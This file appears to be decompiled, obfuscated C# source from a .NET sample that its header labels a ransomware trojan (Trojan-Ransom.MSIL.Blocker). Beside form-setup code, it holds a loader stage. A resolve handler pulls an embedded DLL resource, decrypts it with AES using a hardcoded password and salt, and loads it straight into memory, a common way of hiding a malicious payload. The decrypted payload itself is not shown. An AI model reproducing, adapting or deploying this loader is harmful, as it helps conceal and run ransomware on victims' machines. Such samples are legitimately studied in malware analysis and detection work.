// Decompiled with JetBrains decompiler
// Type: .
// Assembly: tr, Version=89.0.0.7817, Culture=neutral, PublicKeyToken=null
// MVID: C7A59EE7-1CAF-434C-9666-6BB9356A3307
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b2ceb635dd73ee127a1c58cbf61dac4bd7c74ac58cd1468b5296b74acfbb7862.exe

using \u0002;
using \u0003;
using \u0004;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0002
{
  internal class \u0004
  {
    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0005 obj0)
    {
      obj0.\u0001 = new ListView();
      obj0.SuspendLayout();
      if (false)
        return;
      if (false)
        goto label_8;
      else
        goto label_10;
label_7:
      obj0.Controls.Add((Control) obj0.\u0001);
label_8:
      if (true)
      {
        obj0.Name = "Form2";
        obj0.Text = "Form2";
        obj0.ResumeLayout(false);
        return;
      }
      goto label_7;
label_10:
      obj0.\u0001.Dock = DockStyle.Fill;
      obj0.\u0001.HideSelection = false;
      obj0.\u0001.Location = new Point(0, 0);
      obj0.\u0001.Name = "listView1";
      obj0.\u0001.Size = new Size(800, 450);
      obj0.\u0001.TabIndex = 1;
      obj0.\u0001.UseCompatibleStateImageBehavior = false;
      if (true)
      {
        obj0.AutoScaleDimensions = new SizeF(6f, 13f);
        do
        {
          if (false)
            ;
          obj0.AutoScaleMode = AutoScaleMode.Font;
        }
        while (false);
        obj0.ClientSize = new Size(800, 450);
        goto label_7;
      }
      else
        goto label_7;
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0004.\u0003 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static Assembly \u0001(object _param0, ResolveEventArgs _param1)
    {
      int num = _param1.Name.StartsWith("Jaqqcoxlswhfwmhltmuzfs") ? 1 : 0;
      if (true)
        goto label_9;
label_1:
      if (num == 0)
        return (Assembly) null;
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Mghrllxnrowx.Jaqqcoxlswhfwmhltmuzfs.dll"))
      {
        MemoryStream destination = new MemoryStream();
        if (true)
          manifestResourceStream.CopyTo((Stream) destination);
        return AppDomain.CurrentDomain.Load(\u0002.\u0004.\u0001(destination.ToArray()));
      }
label_9:
      num = num != 0 ? 1 : 0;
      goto label_1;
    }

    static void \u0001([In] \u0004.\u0002 obj0)
    {
    }

    static void \u0001([In] \u0004.\u0004 obj0)
    {
      obj0.\u0001 = new ListView();
      obj0.SuspendLayout();
      obj0.\u0001.Dock = DockStyle.Fill;
      obj0.\u0001.HideSelection = false;
      obj0.\u0001.Location = new Point(0, 0);
      obj0.\u0001.Name = "listView1";
      obj0.\u0001.Size = new Size(824, 451);
      do
      {
        obj0.\u0001.TabIndex = 1;
        obj0.\u0001.UseCompatibleStateImageBehavior = false;
        obj0.\u0001.SelectedIndexChanged += new EventHandler(obj0.\u0002);
        obj0.AutoScaleDimensions = new SizeF(6f, 13f);
        obj0.AutoScaleMode = AutoScaleMode.Font;
        obj0.ClientSize = new Size(824, 451);
        obj0.Controls.Add((Control) obj0.\u0001);
        obj0.Name = "Form1";
      }
      while (false);
      obj0.Text = "Form1";
      obj0.Load += new EventHandler(obj0.\u0001);
      obj0.ResumeLayout(false);
    }

    static void \u0001([In] \u0003.\u0002 obj0)
    {
    }

    static void \u0001([In] \u0003.\u0002 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static void \u0001([In] \u0001 obj0)
    {
    }

    static byte[] \u0001(byte[] _param0)
    {
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
label_11:
          rijndaelManaged.BlockSize = 128;
          byte[] bytes = Encoding.UTF8.GetBytes("Kgrbupfeinfzfsimpuomdfmh");
          byte[] salt = new byte[8]
          {
            (byte) 1,
            (byte) 2,
            (byte) 3,
            (byte) 4,
            (byte) 5,
            (byte) 6,
            (byte) 7,
            (byte) 8
          };
          do
          {
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
            if (true)
            {
              rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
              rijndaelManaged.Mode = CipherMode.CBC;
            }
            else
              goto label_11;
          }
          while (false);
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(_param0, 0, _param0.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    static void \u0001([In] \u0004.\u0002 obj0)
    {
    }
  }
}
